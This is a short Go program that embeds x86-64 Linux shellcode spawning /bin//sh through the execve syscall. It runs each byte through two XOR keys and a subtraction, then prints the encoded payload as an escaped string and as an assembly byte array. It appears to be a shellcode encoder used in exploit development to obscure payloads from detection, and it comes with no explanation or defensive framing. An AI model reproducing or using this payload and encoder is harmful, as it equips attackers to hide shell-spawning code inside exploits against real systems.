package main

import "fmt"

const shellcode = string("\x48\x31\xc0\x50\x49\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x41\x57\x48\x89\xe7\x50\x57\x48\x89\xe6\x48\x8d\x57\x08\xb0\x3b\x0f\x05")
const XORByte1 = string("\x40")
const XORByte2 = string("\x60")

func main() {
	// Print as shellcode
	for i := 0; i < len(shellcode); i++ {
		val := XORByte2[0] ^ ((XORByte1[0] ^ shellcode[i]) - 1)
		fmt.Printf("\\x%x", val)
	}
	fmt.Println("\n-----")
	//print as asm byte array
	for i := 0; i < len(shellcode); i++ {
		val := XORByte2[0] ^ ((XORByte1[0] ^ shellcode[i]) - 1)
		fmt.Printf("0x%x,", val)
	}

	fmt.Printf("\nLength:%v", len(shellcode))
}
